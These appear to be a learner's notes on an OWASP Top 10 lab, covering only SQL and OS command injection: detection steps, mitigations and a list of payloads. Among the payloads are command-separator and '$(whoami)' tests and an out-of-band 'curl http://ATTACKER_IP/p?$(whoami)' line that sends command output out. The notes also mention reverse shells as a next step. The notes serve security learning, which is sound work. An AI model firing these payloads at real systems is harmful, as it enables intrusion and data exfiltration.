# OWASP Top10

# Introduction
- This room breaks each OWASP topic down and includes details on what the vulnerability is, how it occurs and how you can exploit it. You will put the theory into practise by completing supporting challenges.
  - Injection
  - Broken Authentication
  - Sensitive Data Exposure
  - XML External Entity
  - Broken Access Control
  - Security Misconfiguration
  - Cross-site Scripting
  - Insecure Deserialization
  - Components with Known Vulnerabilities
  - Insufficent Logging & Monitoring


## Injection

### Concepts learned
- Injection: attacker-controlled input is interpreted as code/commands by a backend (SQL, OS shell, LDAP, etc.).
- Common types: SQL Injection (manipulate database queries) and OS/Command Injection (execute system commands).
- Impact: data disclosure, modification/deletion, remote code execution, full server compromise.
- Defence principles: never treat user input as executable — use allow-lists, parameterized APIs, escaping only as last resort.

### Explanation
**Injection happens when an application concatenates raw input into a command or query string. Example risks:**
  - "... WHERE id = " + user_input → SQL injection (user_input = "1 OR 1=1").
  - passthru("cmd " + user_input) → command injection (user_input = "$(whoami)").
**Active (reflected) vs Blind command injection:**
  - Active: command output is returned in the HTTP response — easy to verify interactively.
  - Blind: output not returned — confirm via timing (sleep), side channels, or OOB callbacks.
**Typical attack primitives:**
  - Command separators: ;, &&, |
  - Inline substitution: $(cmd) or `cmd`
  - Time-based tests: sleep 5
  - OOB exfiltration: curl http://attacker/... or DNS/ping to attacker-controlled service

### Notes — Practical detection, payloads & mitigations
**Quick detection checklist**
  - Identify inputs that reach DBs or system calls (form fields, URL params, headers, file names).
  - Try harmless commands and observe output: whoami, id, uname -a, cat /etc/issue.
  - Separator tests: append ; whoami, && id.
  - Inline tests: $(whoami) or `whoami`.
  - Blind tests: ; sleep 5 (observe latency).
  - OOB tests: trigger curl http://<your-listener>/p and monitor listener.
**Representative payloads**
  - Active check: ?cmd=whoami
  - Separator: ?cmd=blah; whoami
  - Inline: ?cmd=$(whoami)
  - Time-based blind: ?cmd=sleep 5
  - OOB: ?cmd=curl http://ATTACKER_IP/p?$(whoami)
**Typical lab findings**
  - Webserver user often exposed (www-data, apache, www), shell may be nologin.
  - OS/version and MOTD can be enumerated via uname -a and cat /etc/issue.
  - Example artifact: found drpepper.txt in webroot (lab exercise).
**Exploitation notes** 
  - If active exec possible and environment allows, reverse shells are a next step — use safest supported stager (Python/Perl/PHP) and avoid destructive commands.
  - If command output not returned, use timing or OOB callbacks to confirm execution.
  - Document payloads, responses, user context, and any files accessed.
**Mitigations**
  - Eliminate string concatenation for queries/commands.
  - DB: use prepared statements / parameterized queries.
  - OS: use APIs that accept argument arrays (execv style), not shell interpolation.
  - Allow-list input validation (accept known-good values).
  - Escape only when unavoidable, and use context-correct escaping libraries.
  - Least privilege: run services with minimal rights; avoid running web processes as root.
  - Disable dangerous functions where feasible; sandbox critical operations.
  - WAF/RASP can be a temporary layer but don’t substitute secure coding.
  - Log & monitor for suspicious params, time delays, and anomalous outbound requests; alert on OOB callbacks.
**checklist**
  - Record: endpoint, parameter name, full request, successful payload, response, webserver user, OS/version.
  - Categorize: active or blind injection.
  - Recommend fixes: parameterized queries, allow-listing, least privilege, input logging.


